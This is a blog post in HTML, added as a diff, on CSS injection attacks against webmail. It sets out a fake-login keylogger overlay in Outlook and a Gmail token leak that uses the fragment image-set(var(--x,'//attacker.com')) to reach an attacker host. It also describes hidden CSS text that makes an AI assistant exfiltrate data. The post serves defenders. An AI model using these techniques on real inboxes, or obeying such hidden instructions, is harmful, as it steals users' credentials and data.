@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- EDIT: page title -->
+<title>The Style That Steals — CSS as a Weapon Inside Your Inbox | Yana Ivanov</title>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Serif:wght@400;600;700&family=Playfair+Display:wght@400;700;900&family=JetBrains+Mono:wght@400;600&family=Source+Serif+4:ital,wght@0,300;0,400;0,600;1,300;1,400&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+<style>
+/* ════════════════════════════════════════════════════════════
+   DESIGN TOKENS — do not edit
+   ════════════════════════════════════════════════════════════ */
+:root{
+  --ink:#0a0f1a;--ink2:#1e2d45;--ink3:#374151;
+  --red:#c0392b;--red-dim:rgba(192,57,43,0.08);
+  --amber:#b45309;--amber-dim:rgba(180,83,9,0.08);
+  --blue:#1a4fa0;--blue-dim:rgba(26,79,160,0.08);
+  --green:#145a32;--green-dim:rgba(20,90,50,0.08);
+  --rule:#e2e8f0;--bg:#f8fafc;--paper:#ffffff;
+  --mono:'JetBrains Mono',monospace;
+  --serif:'Source Serif 4','Georgia',serif;
+  --display:'Playfair Display','Georgia',serif;
+  --display-clean:'IBM Plex Serif','Georgia',serif;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;font-size:20px}
+body{font-family:var(--serif);background:var(--bg);color:var(--ink);line-height:1.8;font-size:20px}
+a{color:var(--blue);text-decoration:none}
+a:hover{text-decoration:underline}
+
+/* ── NAV ── */
+.back-nav{background:#0a0f1a;padding:.65rem 3rem;display:flex;align-items:center;border-bottom:1px solid rgba(255,255,255,.08);position:sticky;top:0;z-index:999}
+.back-nav a,.back-nav-link{font-family:var(--mono);font-size:.65rem;letter-spacing:.12em;color:#4a9eff;text-decoration:none;text-transform:uppercase;display:inline-flex;align-items:center;gap:.5rem;transition:color .2s}
+.back-nav a:hover,.back-nav-link:hover{color:#93c5fd}
+.back-nav a::before,.back-nav-link::before{content:'←';font-size:.75rem}
+
+/* ── MASTHEAD ── */
+.masthead{background:#0a0f1a;color:#fff;padding:3.5rem 0 0;position:relative;overflow:hidden}
+.masthead::before{content:'';position:absolute;inset:0;
+  background:repeating-linear-gradient(0deg,transparent,transparent 39px,rgba(255,255,255,.025) 39px,rgba(255,255,255,.025) 40px),
+  repeating-linear-gradient(90deg,transparent,transparent 39px,rgba(255,255,255,.025) 39px,rgba(255,255,255,.025) 40px);
+  pointer-events:none}
+.mast-inner{max-width:900px;margin:0 auto;padding:0 3rem;position:relative;z-index:1}
+
+/* Kicker with decorative lines — blue theme style */
+.mast-label{font-family:var(--mono);font-size:.7rem;letter-spacing:.2em;color:#60a5fa;text-transform:uppercase;margin-bottom:1.5rem;display:flex;align-items:center;gap:.75rem}
+.mast-label::before,.mast-label::after{content:'';display:inline-block;width:32px;height:1px;background:#60a5fa}
+
+h1.title{font-family:var(--display-clean);font-size:clamp(1.9rem,4vw,2.9rem);font-weight:600;line-height:1.15;margin-bottom:1.5rem;color:#fff}
+h1.title span{color:#60a5fa}
+.mast-meta{display:grid;grid-template-columns:1fr 1fr 1fr;gap:2rem;padding:2rem 0 3rem;border-top:1px solid rgba(255,255,255,.12);margin-top:2rem}
+.meta-item .label{font-family:var(--mono);font-size:.65rem;letter-spacing:.15em;color:#94a3b8;text-transform:uppercase;margin-bottom:.3rem}
+.meta-item .value{font-size:.9rem;color:#e2e8f0;font-weight:600;font-family:var(--mono);word-break:break-word}
+
+/* Blue bar — wraps naturally */
+.mast-bar{background:#1a4fa0;margin-top:0;padding:.8rem 3rem;font-family:var(--mono);font-size:.72rem;letter-spacing:.08em;color:#fff;display:flex;align-items:center;gap:.75rem}
+.mast-bar-dot{width:7px;height:7px;min-width:7px;border-radius:50%;background:#4a9eff;flex-shrink:0;animation:blink 1.5s ease-in-out infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.2}}
+
+/* ── LAYOUT ── */
+.wrap{max-width:900px;margin:0 auto;padding:0 3rem}
+.content{padding:4rem 0}
+.section{margin-bottom:4rem;padding-bottom:4rem;border-bottom:1px solid var(--rule)}
+.section:last-child{border-bottom:none;margin-bottom:0;padding-bottom:0}
+.section-num{font-family:var(--mono);font-size:.65rem;letter-spacing:.2em;color:var(--blue);text-transform:uppercase;margin-bottom:.75rem}
+h2{font-family:var(--display);font-size:1.75rem;font-weight:700;color:var(--ink);line-height:1.25;margin-bottom:1.5rem;letter-spacing:-.01em}
+h3{font-family:var(--display);font-size:1.2rem;font-weight:700;color:var(--ink2);margin:2rem 0 .75rem}
+p{margin-bottom:1.25rem;color:var(--ink3)}
+p strong{color:var(--ink);font-weight:600}
+p em{font-style:italic;color:var(--ink2)}
+
+/* ── CALLOUTS ── */
+.callout{padding:1.25rem 1.5rem;border-radius:2px;margin:1.75rem 0;border-left:4px solid}
+.callout-blue{background:var(--blue-dim);border-color:var(--blue)}
+.callout-amber{background:var(--amber-dim);border-color:var(--amber)}
+.callout-green{background:var(--green-dim);border-color:var(--green)}
+.callout-red{background:var(--red-dim);border-color:var(--red)}
+.callout p{margin:0;font-size:.92rem;line-height:1.7}
+.callout strong{color:var(--ink)}
+
+/* ── TABLES ── */
+.tbl-wrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:1.5rem 0}
+table{width:100%;border-collapse:collapse;font-size:.88rem}
+thead tr{background:#0a0f1a;color:#fff}
+th{padding:.75rem 1rem;text-align:left;font-family:var(--mono);font-size:.7rem;letter-spacing:.1em;text-transform:uppercase;font-weight:600}
+td{padding:.7rem 1rem;border-bottom:1px solid var(--rule);color:var(--ink3);vertical-align:top}
+tr:last-child td{border-bottom:none}
+tr:nth-child(even) td{background:rgba(0,0,0,.018)}
+td strong{color:var(--ink);font-weight:600}
+td.blue{color:var(--blue);font-weight:600;font-family:var(--mono);font-size:.82rem}
+td.amber{color:var(--amber);font-weight:600;font-family:var(--mono);font-size:.82rem}
+td.green{color:var(--green);font-weight:600;font-family:var(--mono);font-size:.82rem}
+td.red{color:var(--red);font-weight:600;font-family:var(--mono);font-size:.82rem}
+td.code{font-family:var(--mono);font-size:.8rem;color:var(--blue)}
+
+/* ── STAT CARD (blue theme uses mat-card wrapper) ── */
+.mat-card{background:var(--paper);border:1px solid var(--rule);margin:2rem 0;overflow:hidden}
+.mat-card-title{font-family:var(--mono);font-size:.65rem;letter-spacing:.15em;text-transform:uppercase;color:var(--ink3);padding:.75rem 1.25rem;border-bottom:1px solid var(--rule);background:#f8fafc}
+.stat-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:0}
+.stat-item{padding:1.75rem 1.5rem;border-right:1px solid var(--rule);text-align:center}
+.stat-item:last-child{border-right:none}
+/* Numbers: IBM Plex Serif, clean editorial style */
+.stat-num{font-family:var(--display-clean);font-size:1.4rem;font-weight:700;line-height:1;margin-bottom:.5rem;letter-spacing:-.01em}
+.stat-label{font-family:var(--mono);font-size:.6rem;letter-spacing:.1em;color:var(--ink3);text-transform:uppercase;margin-bottom:.35rem;line-height:1.4}
+.stat-sub{font-size:.75rem;color:#94a3b8;line-height:1.5;font-family:var(--serif)}
+.stat-blue .stat-num{color:var(--blue)}
+.stat-amber .stat-num{color:var(--amber)}
+.stat-red .stat-num{color:var(--red)}
+.stat-green .stat-num{color:var(--green)}
+
+/* ── FIGURE (for diagrams, screenshots, code blocks) ── */
+.figure{background:var(--paper);border:1px solid var(--rule);margin:2rem 0;overflow:hidden}
+.figure.figure-dark{background:#0a0f1a;border-color:#1e2d45}
+.figure-title{background:#0a0f1a;color:#fff;padding:.7rem 1.2rem;font-family:var(--mono);font-size:.65rem;letter-spacing:.12em;text-transform:uppercase}
+.figure.figure-dark .figure-title{background:#111827;border-bottom:1px solid #1e2d45}
+.figure-body{padding:1.75rem}
+.figure-caption{padding:.75rem 1.2rem;background:var(--bg);border-top:1px solid var(--rule);font-size:.78rem;color:var(--ink3);font-style:italic}
+.figure.figure-dark .figure-caption{background:#111827;border-top-color:#1e2d45;color:#64748b}
+
+/* ── TIMELINE (horizontal grid — blue theme style) ── */
+.timeline{margin:0;display:grid;gap:0;border:1px solid var(--rule)}
+.tl-item{display:grid;grid-template-columns:140px 1fr;border-bottom:1px solid var(--rule)}
+.tl-item:last-child{border-bottom:none}
+.tl-left{padding:1.5rem 1.25rem;border-right:1px solid var(--rule);background:#f8fafc}
+.tl-date{font-family:var(--mono);font-size:.72rem;color:var(--blue);font-weight:700;margin-bottom:.3rem}
+.tl-tag{font-family:var(--mono);font-size:.6rem;color:#94a3b8;letter-spacing:.06em;text-transform:uppercase;line-height:1.4}
+.tl-right{padding:1.5rem}
+.tl-title{font-family:var(--display);font-size:1rem;font-weight:700;color:var(--ink);margin-bottom:.5rem;line-height:1.3}
+.tl-body{font-size:.88rem;color:var(--ink3);line-height:1.7;margin:0}
+
+/* ── STEP LIST ── */
+.step-list{margin:1.5rem 0}
+.step-item{display:grid;grid-template-columns:2.5rem 1fr;gap:1rem;margin-bottom:1.25rem;align-items:start}
+.step-num{width:2.2rem;height:2.2rem;border-radius:50%;background:var(--blue);color:#fff;display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:.75rem;font-weight:600;flex-shrink:0;margin-top:.15rem}
+.step-content-label{font-family:var(--mono);font-size:.82rem;font-weight:600;color:var(--ink);margin-bottom:.3rem;letter-spacing:.02em}
+.step-content-desc{font-size:.85rem;color:var(--ink3);line-height:1.65}
+
+/* ── CODE BLOCKS (lab logs only) ── */
+.code-label{font-family:var(--mono);font-size:.62rem;letter-spacing:.15em;color:#4a9eff;text-transform:uppercase;margin-bottom:.5rem}
+.code-block{background:#0a0f1a;border-radius:2px;padding:1.25rem 1.5rem;margin:1.5rem 0;overflow-x:auto;border-left:3px solid #1a4fa0}
+.code-block pre{font-family:var(--mono);font-size:.8rem;color:#e2e8f0;line-height:1.7;white-space:pre-wrap;word-break:break-word}
+.code-block .prompt{color:#4a9eff}
+.code-block .comment{color:#64748b}
+.code-block .highlight{color:#4ade80}
+.code-block .warning{color:#ef4444}
+.code-block .error{color:#f97316}
+/* shorthand color spans for inline use */
+.co{color:#94a3b8}.hi{color:#4ade80}.wa{color:#ef4444}.ke{color:#fbbf24}.va{color:#4a9eff}
+
+/* ── TERMINAL WINDOW (macOS-style, for script output) ── */
+.terminal{background:#0a0f1a;border-radius:2px;padding:1.25rem 1.5rem;margin:1.5rem 0;overflow-x:auto;border-left:3px solid #1a4fa0}
+.terminal-bar{display:flex;align-items:center;gap:.5rem;margin-bottom:1rem;padding-bottom:.75rem;border-bottom:1px solid rgba(255,255,255,.08)}
+.terminal-dot{width:10px;height:10px;border-radius:50%}
+.terminal-title{font-family:var(--mono);font-size:.6rem;color:#94a3b8;letter-spacing:.1em;text-transform:uppercase;margin-left:.5rem}
+.terminal pre{font-family:var(--mono);font-size:.76rem;line-height:1.7;white-space:pre-wrap;word-break:break-word;color:#e2e8f0}
+/* terminal text color classes */
+.t-red{color:#ef4444;font-weight:bold}
+.t-orange{color:#fb923c;font-weight:bold}
+.t-blue{color:#60a5fa;font-weight:bold}
+.t-green{color:#4ade80}
+.t-dim{color:#94a3b8} /* was #475569 — bumped for legibility */
+.t-bold{color:#e2e8f0;font-weight:bold}
+
+/* ── HOST CARD (dark card for IP/host data) ── */
+.host-card{background:#0a0f1a;border-radius:2px;padding:1.5rem;margin:1.75rem 0;display:grid;grid-template-columns:repeat(2,1fr);gap:1.25rem}
+.hf-label{font-family:var(--mono);font-size:.58rem;letter-spacing:.15em;color:#94a3b8;text-transform:uppercase;margin-bottom:.3rem}
+.hf-value{font-family:var(--mono);font-size:.9rem;color:#4a9eff;font-weight:600}
+.hf-value.red{color:#ef4444}
+.hf-value.green{color:#4ade80}
+.hf-value.amber{color:#fbbf24}
+
+/* ── LAB ENVIRONMENT BOX (lab logs only) ── */
+.env-box{background:var(--paper);border:1px solid var(--rule);padding:1.5rem;margin:1.75rem 0}
+.env-box-title{font-family:var(--mono);font-size:.65rem;letter-spacing:.15em;color:var(--blue);text-transform:uppercase;margin-bottom:1rem;padding-bottom:.5rem;border-bottom:1px solid var(--rule)}
+.env-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem}
+.env-item .env-label{font-family:var(--mono);font-size:.62rem;color:#94a3b8;letter-spacing:.1em;text-transform:uppercase;margin-bottom:.2rem}
+.env-item .env-value{font-family:var(--mono);font-size:.82rem;color:var(--ink)}
+
+/* ── COMPARE GRID (side-by-side comparison) ── */
+.compare-grid{display:grid;grid-template-columns:1fr 1fr;gap:1.5rem;margin:1.75rem 0}
+.compare-box{background:var(--paper);border:1px solid var(--rule);padding:1.25rem}
+.compare-box.left{border-top:3px solid var(--blue)}
+.compare-box.right{border-top:3px solid var(--amber)}
+.compare-box.danger{border-top-color:var(--red)}
+.compare-box.safe{border-top-color:var(--green)}
+.compare-label{font-family:var(--mono);font-size:.65rem;letter-spacing:.1em;text-transform:uppercase;font-weight:600;margin-bottom:.75rem}
+.compare-box.left .compare-label{color:var(--blue)}
+.compare-box.right .compare-label{color:var(--amber)}
+.compare-box.danger .compare-label{color:var(--red)}
+.compare-box.safe .compare-label{color:var(--green)}
+.compare-box p{font-size:.88rem;color:var(--ink3);margin-bottom:.5rem;line-height:1.6}
+.compare-box p:last-child{margin-bottom:0}
+
+/* ── FUNCTION CARDS GRID (for script/tool documentation) ── */
+.fn-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin:1.75rem 0}
+.fn-card{background:var(--paper);border:1px solid var(--rule);padding:1rem 1.1rem;border-top:2px solid var(--blue)}
+.fn-name{font-family:var(--mono);font-size:.78rem;font-weight:600;color:var(--blue);margin-bottom:.3rem}
+.fn-desc{font-size:.82rem;color:var(--ink3);line-height:1.55}
+
+/* ── NIST MAPPING BOX (lab logs only) ── */
+.nist-box{background:var(--blue-dim);border:1px solid rgba(26,79,160,.2);padding:1.25rem 1.5rem;margin:1.75rem 0}
+.nist-box-title{font-family:var(--mono);font-size:.68rem;letter-spacing:.15em;color:var(--blue);text-transform:uppercase;margin-bottom:.85rem;font-weight:700}
+.nist-items{display:grid;gap:.85rem}
+.nist-item{display:grid;grid-template-columns:90px 1fr;gap:1rem;align-items:start}
+.nist-control{font-family:var(--mono);font-size:.75rem;font-weight:700;color:var(--blue);padding-top:.15rem}
+.nist-desc{font-size:.88rem;color:var(--ink3);line-height:1.7}
+.nist-desc strong{color:var(--ink)}
+
+/* ── TOOL EMBED (for pages with interactive tools) ── */
+.tool-embed{background:var(--paper);border:1px solid var(--rule);margin:2rem 0;overflow:hidden}
+.tool-embed-header{background:#0a0f1a;color:#fff;padding:.7rem 1.2rem;font-family:var(--mono);font-size:.65rem;letter-spacing:.12em;text-transform:uppercase;display:flex;align-items:center;gap:.5rem}
+.tool-embed-body{padding:1.75rem;overflow-x:auto;-webkit-overflow-scrolling:touch}
+
+/* ── BIO ── */
+.bio{background:#0a0f1a;color:#fff;padding:3rem;display:grid;
+  grid-template-columns:auto 1fr;gap:2rem;align-items:start}
+.bio-avatar{width:64px;height:64px;border-radius:50%;background:#1a4fa0;display:flex;align-items:center;justify-content:center;font-family:var(--display);font-size:1.5rem;font-weight:700;color:#fff;flex-shrink:0}
+.bio-name{font-family:var(--display);font-size:1.2rem;font-weight:700;margin-bottom:.25rem}
+.bio-title{font-family:var(--mono);font-size:.7rem;color:#60a5fa;letter-spacing:.1em;margin-bottom:.75rem}
+.bio-text{font-size:.88rem;color:#cbd5e1;line-height:1.7;margin:0}
+
+/* ── FOOTER ── */
+footer{background:#1e2d45;color:#64748b;padding:1.5rem 3rem;
+  font-family:var(--mono);font-size:.7rem;letter-spacing:.06em;
+  display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:.5rem}
+footer span{color:#94a3b8}
+
+/* ── MOBILE NOTICE ── */
+.mobile-notice{display:none;background:#1e2d45;border-bottom:1px solid rgba(255,255,255,.08);padding:.55rem 1.5rem;font-family:var(--mono);font-size:.62rem;letter-spacing:.06em;color:#94a3b8;text-align:center}
+.mobile-notice strong{color:#60a5fa}
+
+/* ════════════════════════════════════════════════════════════
+   RESPONSIVE — do not edit
+   ════════════════════════════════════════════════════════════ */
+@media(max-width:1024px){.mobile-notice{display:block}}
+@media(max-width:768px){
+  .wrap,.mast-inner,.back-nav{padding-left:1.75rem;padding-right:1.75rem}
+  .mast-meta{grid-template-columns:1fr 1fr}
+  .stat-grid{grid-template-columns:1fr 1fr}
+  .stat-item{border-bottom:1px solid var(--rule)}
+  .tl-item{grid-template-columns:1fr}
+  .tl-left{border-right:none;border-bottom:1px solid var(--rule);padding:1rem 1.25rem}
+  .env-grid{grid-template-columns:1fr}
+  .nist-item{grid-template-columns:80px 1fr}
+  .compare-grid{grid-template-columns:1fr}
+  .fn-grid{grid-template-columns:1fr}
+  .host-card{grid-template-columns:1fr}
+  h2{font-size:1.55rem}
+  h3{font-size:1.1rem}
+  .bio{grid-template-columns:1fr;padding:2rem 1.75rem}
+  footer{flex-direction:column;text-align:center;padding:1.5rem}
+}
+@media(max-width:680px){
+  .wrap,.mast-inner,.back-nav{padding-left:1.5rem;padding-right:1.5rem}
+  .mast-meta{grid-template-columns:1fr}
+  .stat-grid{grid-template-columns:1fr 1fr}
+  .stat-num{font-size:1.2rem}
+  .mast-bar{padding:.55rem 1.5rem;font-size:.62rem}
+  h1.title{font-size:1.65rem}
+  h2{font-size:1.35rem}
+  .bio{padding:2rem 1.5rem}
+  footer{padding:1.5rem}
+}
+@media(max-width:480px){
+  .wrap,.mast-inner{padding-left:1.1rem;padding-right:1.1rem}
+  .back-nav{padding:.55rem 1.1rem}
+  .mast-bar{padding:.55rem 1.1rem;font-size:.6rem}
+  .mast-meta{grid-template-columns:1fr}
+  h1.title{font-size:1.45rem}
+  h2{font-size:1.2rem}
+  .bio{padding:1.5rem 1.1rem}
+  footer{padding:1.25rem 1.1rem}
+}
+/* ── MODERN PHONES — iPhone 15/16 (390px), iPhone 14 Pro (393px) ── */
+@media(max-width:390px){
+  html{font-size:16px}
+  .wrap,.mast-inner{padding-left:.9rem;padding-right:.9rem}
+  .back-nav{padding:.5rem .9rem}
+  .mast-bar{padding:.5rem .9rem;font-size:.6rem}
+  .stat-grid{grid-template-columns:1fr 1fr}
+  .stat-num{font-size:1.1rem}
+  .stat-label{font-size:.55rem}
+  h1.title{font-size:1.3rem}
+  h2{font-size:1.1rem}
+  h3{font-size:.95rem}
+  .figure-body{padding:.75rem .65rem}
+  .timeline .tl-left{padding:.75rem .9rem}
+  .bio{padding:1.25rem .9rem}
+  .bio-avatar{width:52px;height:52px;font-size:1.2rem}
+  footer{padding:1rem .9rem;font-size:.62rem}
+  .code-block,.terminal{padding:.85rem .9rem;font-size:.7rem}
+  th{padding:.55rem .65rem;font-size:.6rem}
+  td{padding:.5rem .65rem}
+}
+@media(min-width:768px) and (orientation:landscape){
+  .mobile-notice{display:none}
+}
+</style>
+    <!-- Privacy-friendly analytics by Plausible -->
+    <script async src="https://plausible.io/js/pa-NXVpsfumVAR2LJELxP_So.js"></script>
+    <script>
+      window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+      plausible.init()
+    </script>
+</head>
+<body>
+
+<!-- ══ MOBILE NOTICE ══ -->
+<div class="mobile-notice"><strong>Intentionally desktop-first</strong> — best experienced on a workstation</div>
+
+<!-- ══ NAV ══ -->
+<div class="back-nav"><a href="/">Portfolio</a></div>
+
+<!-- ══ MASTHEAD ══ -->
+<div class="masthead">
+  <div class="mast-inner">
+
+    <div class="mast-label">Field Notes</div>
+
+    <h1 class="title">The Style That Steals —<br><span>CSS as a Weapon Inside Your Inbox</span></h1>
+
+    <div class="mast-meta">
+      <div class="meta-item"><div class="label">Author</div><div class="value">Yana Ivanov</div></div>
+      <div class="meta-item"><div class="label">Published</div><div class="value">August 2026</div></div>
+      <div class="meta-item"><div class="label">Category</div><div class="value">Field Notes · Email Security</div></div>
+      <div class="meta-item"><div class="label">Research Source</div><div class="value">Portswigger · APT28 · OTX</div></div>
+      <div class="meta-item"><div class="label">Platforms Affected</div><div class="value">Gmail · Outlook · Yahoo · Fastmail · ProtonMail</div></div>
+      <div class="meta-item"><div class="label">Read Time</div><div class="value">9 minutes</div></div>
+    </div>
+  </div>
+
+  <div class="mast-bar">
+    <div class="mast-bar-dot"></div>
+    APT28 USED CSS INJECTION TOOLS IN APRIL 2026 · PORTSWIGGER PUBLISHED THE RESEARCH IN AUGUST 2026 · WE WERE FOUR MONTHS BEHIND
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════════════════════════
+     CONTENT
+     ════════════════════════════════════════════════════════════ -->
+<div class="wrap"><div class="content">
+
+<!-- SECTION 01 -->
+<div class="section">
+  <div class="section-num">Section 01</div>
+  <h2>The Dead Link</h2>
+
+  <p>This morning I was reading my tldrsec newsletter — one of the most respected security newsletters in the industry, written by Clint Gibler, signed and authenticated by tldrsec.com. I clicked a link inside it. The link led nowhere. A blank page. A 404.</p>
+
+  <p>I know what I know. So I ran the checks. Active network connections, processes making outbound calls, LaunchAgents, the things you look for when something feels off. Everything came back clean. It was just a broken link — the kind that happens when a curated newsletter links to an article that gets moved or taken down. Nothing more.</p>
+
+  <p>But here is what I thought about while the terminal was running: I would not have known if it had not been clean. Not from that click alone. Because the attack that Portswigger researcher Gareth Heyes presented at Black Hat USA 2026 eight days ago does not ask you to download anything. It does not ask you to click a suspicious link. It does not send you to a fake login page at some obviously wrong domain. The attack happens inside the email itself. You open it. You read it. The CSS fires. And by the time you close the tab, something has already left.</p>
+
+  <p>CSS. Cascading Style Sheets. The language that makes text the right font size and buttons the right color. The thing that every email uses, that every email client renders, that you cannot turn off without breaking the visual experience of email entirely. That is the weapon Portswigger documented. That is the weapon APT28 was already using four months before Portswigger published the research.</p>
+
+  <div class="callout callout-blue">
+    <p><strong>The timing that matters:</strong> On April 17, 2026, an OTX AlienVault pulse documented Operation Roundish — an exposed open directory revealing APT28's complete Roundcube exploitation toolkit. The toolkit included XSS payloads, a Flask-based C2 server, and CSS injection tools targeting Ukraine's State Migration Service. On August 6, 2026, Portswigger published the research explaining exactly how CSS injection works against webmail. The attack preceded the public documentation by four months. By the time defenders read the paper, the campaign had already run.</p>
+  </div>
+
+</div>
+
+<!-- SECTION 02 -->
+<div class="section">
+  <div class="section-num">Section 02</div>
+  <h2>How It Works — What the Sanitizer Thinks It Approved</h2>
+
+  <p>Every webmail platform — Gmail, Outlook, Yahoo, Fastmail, ProtonMail, AOL — has the same problem. It receives untrusted HTML from strangers and has to display it safely inside a trusted interface. To do that, it runs the email through a sanitizer. The sanitizer looks at the HTML and CSS, strips anything it considers dangerous — JavaScript, iframes, certain tags — and passes the rest through. The browser then renders what the sanitizer approved.</p>
+
+  <p>The gap that Portswigger found is the space between what the sanitizer thinks it approved and what the browser actually renders. These are not the same thing. CSS is complex enough, and the relationship between the sanitizer and the browser is imperfect enough, that an attacker who understands both can send CSS that looks safe to the sanitizer and behaves dangerously in the browser.</p>
+
+  <p>The specific techniques Heyes documented are technically dense, but the outcomes translate simply:</p>
+
+  <p><strong>The Outlook password keylogger.</strong> Using a CSS gadget — a technique where existing JavaScript on the Outlook page appends elements with CSS properties outside the email sanitizer's allow list — combined with a carefully crafted select element disguised as a password input, an attacker can overlay the entire Outlook interface with a fake Microsoft login screen. When the victim types their password into what appears to be a legitimate sign-in form, the keystrokes are captured in real time and sent to attacker infrastructure. The victim sees Outlook. They think they are signing in. The password is already gone.</p>
+
+  <p><strong>The Gmail token exfiltration.</strong> Gmail's image sanitization proxies external image requests to protect the user's IP. Heyes found that <code>image-set(var(--x,'//attacker.com'))</code> — using a CSS variable with a fallback URL — bypassed this proxy and made a direct external request. Combined with CSS attribute selectors that match specific URL patterns, this technique can extract authentication tokens from emails in the victim's inbox by making outbound requests to attacker infrastructure as the email is rendered. Gmail confirmed this still worked when the research was published.</p>
+
+  <p><strong>The AI prompt injection via CSS.</strong> This is the one that stopped me. Using CSS pseudo-elements — `:before` and `:after` — combined with opacity close to zero, an attacker can embed text in an email that is invisible to the human reading it but fully readable by an AI assistant processing the inbox. When the victim asks their AI email tool to translate or summarize the message, the AI reads the hidden instructions instead of the visible content. In the demonstrated chain, this caused an AI browser to open multiple tabs and exfiltrate the victim's name encoded in URL fragments — all while the human saw only harmless French text and thought they were asking for a translation.</p>
+
+  <div class="callout callout-amber">
+    <p><strong>Why CSS is harder to defend against than JavaScript:</strong> JavaScript in email has a known defense — block it entirely, which every major email client does. CSS cannot be blocked entirely without breaking the visual experience of every email. You cannot strip `:before` and `:after` pseudo-elements without breaking legitimate email formatting. You cannot block all external image requests without breaking newsletter images. The attack exploits features that are necessary, not features that are optional. This is the structural problem that makes CSS injection fundamentally different from XSS.</p>
+  </div>
+
+</div>
+
+<!-- SECTION 03 -->
+<div class="section">
+  <div class="section-num">Section 03</div>
+  <h2>APT28 Got Here First</h2>
+
+  <p>What makes the Portswigger research significant is not the novelty of the concept — CSS injection as an attack surface has been discussed in academic circles for years. What makes it significant is the specificity: Heyes built working proof-of-concept exploits against real webmail platforms, documented the exact techniques, and presented them at Black Hat USA 2026 on August 6.</p>
+
+  <p>Four months earlier, APT28 — the Russian GRU unit also known as Fancy Bear, responsible for the 2016 Democratic National Committee breach, the NotPetya preparation campaigns, and <a href="https://yanaivanov.com/analysis/roundpress_analysis.html">Operation RoundPress</a> — had already built and deployed a complete Roundcube exploitation toolkit that included CSS injection tools as a documented component. The Operation Roundish exposure came from an open directory — a mistake on the attacker's part that let researchers see inside the toolkit. Inside were XSS payloads, a Flask-based C2 server, and CSS injection tools targeting Ukraine's State Migration Service at mail.dmsu.gov.ua.</p>
+
+  <p>APT28 was not doing this because they read a Portswigger blog post. They were doing this because they had already discovered independently what Heyes later documented publicly: that CSS, rendered inside a trusted webmail interface, can be weaponized to break out of the email message window and interact with the trusted UI around it. The research and the operation arrived at the same technique from different directions.</p>
+
+  <div class="mat-card">
+    <div class="mat-card-title">The CSS Attack Surface — What Was Confirmed</div>
+    <div class="stat-grid">
+      <div class="stat-item stat-red">
+        <div class="stat-num">6</div>
+        <div class="stat-label">Major Platforms Affected</div>
+        <div class="stat-sub">Gmail, Outlook, Yahoo, AOL, Fastmail, ProtonMail — all confirmed vulnerable to at least one technique.</div>
+      </div>
+      <div class="stat-item stat-red">
+        <div class="stat-num">4mo</div>
+        <div class="stat-label">Defender Gap</div>
+        <div class="stat-sub">APT28 CSS injection tools documented in April 2026. Portswigger research published August 2026.</div>
+      </div>
+      <div class="stat-item stat-amber">
+        <div class="stat-num">2</div>
+        <div class="stat-label">Still Unpatched</div>
+        <div class="stat-sub">Outlook label-jacking and Gmail image-set() bypass confirmed working as of August 6, 2026.</div>
+      </div>
+      <div class="stat-item stat-amber">
+        <div class="stat-num">0</div>
+        <div class="stat-label">Sublime Rules</div>
+        <div class="stat-sub">No existing detection rule in the open-source feed targets CSS injection patterns in email bodies.</div>
+      </div>
+    </div>
+  </div>
+
+  <p>The target population is the same one I have been writing about all year. Self-hosted Roundcube and Zimbra deployments in Eastern European government agencies — organizations that chose their own mail infrastructure for sovereignty reasons and cannot push patches as fast as Google or Microsoft can. Your personal Gmail will likely have the image-set bypass fixed within weeks of this writing. The Ukrainian ministry still running an unpatched Roundcube server will be waiting considerably longer. The CSS injection toolkit in APT28's open directory was aimed at exactly that gap.</p>
+
+  <p>The commercial platforms are not safe either. Gmail's image-set bypass still works. Outlook's label-jacking still works. ProtonMail quietly fixed a proxy bypass without acknowledging it as a vulnerability. Fastmail patched two CSS mutation bugs and paid the bounty. The landscape of what is fixed and what is not is inconsistent across providers and inconsistent across browser combinations — the same email can be safe in Chrome and exploitable in Firefox, or vice versa.</p>
+
+</div>
+
+<!-- SECTION 04 — CONCLUSION -->
+<div class="section">
+  <div class="section-num">Section 04</div>
+  <h2>What This Means for Defenders</h2>
+
+  <p>The honest answer is that most defenders cannot patch CSS injection vulnerabilities — that is the webmail providers' job. What defenders can do is understand what the attack looks like so they can recognize it, report it, and apply pressure on providers to fix it.</p>
+
+  <p>For security teams specifically, there is a detection opportunity at the email delivery layer that no one has yet captured. The CSS patterns that enable these attacks — <code>position:fixed</code> used to overlay the entire email client interface, <code>&lt;select&gt;</code> elements disguised as password inputs, <code>:has()</code> and <code>:checked</code> pseudo-classes used to build keyloggers, <code>@font-face</code> rules with <code>unicode-range</code> used to measure digit heights for token extraction — are not present in legitimate marketing emails, newsletters, or business correspondence. They are highly specific to the attack techniques Heyes documented. A detection rule targeting these patterns in the raw HTML of inbound emails would be tight, low false positive, and currently uncovered by any existing open-source rule. I am working on one.</p>
+
+  <p>For individuals: the most effective current defense is the simplest and least popular one. Disable automatic loading of remote images. Every major desktop email client has this setting. When images do not auto-load, image proxy bypasses cannot fire, tracking pixels cannot phone home, and several of the exfiltration techniques documented in this research stop working before they start. On webmail in a browser, rendering email in a sandboxed iframe — which Portswigger recommends as the correct architectural fix for providers — would prevent most of the documented attacks. No major provider has fully implemented it yet.
+
+  <p><strong>A note on the image-loading defense:</strong> Disabling remote images stops several specific exfiltration techniques — image proxy bypasses, tracking pixels, and background URL requests that phone home. But it is not a complete defense. The Outlook keylogger Heyes demonstrated does not require external image requests at all — it captures keystrokes and can exfiltrate them through link clicks using CSS positioning, not image loads. And the Gmail bypass specifically exploited a CSS variable fallback pattern that the "remote images disabled" setting did not catch, because Gmail's image blocking targeted traditional image URLs, not the <code>image-set(var(--x,'//attacker.com'))</code> syntax. Disabling remote images narrows the attack surface meaningfully. It does not close it.</p></p>
+
